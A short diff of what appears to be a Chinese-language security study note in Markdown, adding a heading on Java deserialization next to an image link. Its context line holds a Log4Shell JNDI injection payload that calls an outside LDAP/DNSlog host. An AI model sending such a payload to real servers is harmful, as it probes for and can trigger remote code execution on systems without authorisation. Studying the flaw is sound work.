@@ -527,3 +527,6 @@ ${jndi:ldap://wffsr5.dnslog.cn:9999}
 >
 >   ![img](https://gitee.com/leiye87/typora_picture/raw/master/20230428093351.png)
 
+
+
+## java反序列化
